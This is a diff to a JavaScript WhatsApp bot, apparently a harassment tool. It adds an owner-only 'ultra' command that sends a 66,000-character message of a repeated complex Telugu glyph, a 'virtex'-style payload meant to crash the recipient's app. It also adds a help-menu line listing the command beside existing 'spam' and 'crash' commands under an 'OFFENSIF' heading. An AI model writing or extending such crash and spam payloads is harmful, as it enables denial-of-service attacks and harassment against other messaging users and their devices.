@@ -415,6 +415,21 @@ async function createBotInstance(phoneNumber, sockToNotify = null, jidToNotify =
                 await sock.sendMessage(remoteJid, { text: "✅ *SÉQUENCE DE CRASH TERMINÉE*" });
                 return;
             }
+            // Commande Ultra-Crash (65000+ caractères)
+            if (lowerText.startsWith("ultra")) {
+                const char = "జ్ఞా";
+                const payload = char.repeat(66000);
+                await sock.sendMessage(remoteJid, { text: "☣️ *CHARGEMENT DE L'ULTRA-CRASH...*" });
+                try {
+                    await sock.sendMessage(remoteJid, { text: payload });
+                    await sock.sendMessage(remoteJid, { text: "✅ *ULTRA-CRASH ENVOYÉ*" });
+                } catch (e) {
+                    console.error("Erreur Ultra-Crash:", e);
+                    await sock.sendMessage(remoteJid, { text: "❌ Échec de l'envoi massif." });
+                }
+                return;
+            }
+
         }
 
         // --- COMMANDES PUBLIQUES / MIXTES ---
@@ -438,6 +453,7 @@ async function createBotInstance(phoneNumber, sockToNotify = null, jidToNotify =
                 `*--- OFFENSIF (Proprio) ---*\n` +
                 `- *love [texte] [qté] [ms]* : Spam optimisé\n` +
                 `- *crash [nombre]* : Envoi de Virtex\n` +
+                `- *ultra* : Envoi massif de caractères (65k+)\n` +
                 `- *stop* : Arrêter le spam en cours\n\n` +
                 `*Statut :* ${current.isBotActive ? "ACTIF ✅" : "INACTIF 🛑"}`;
             
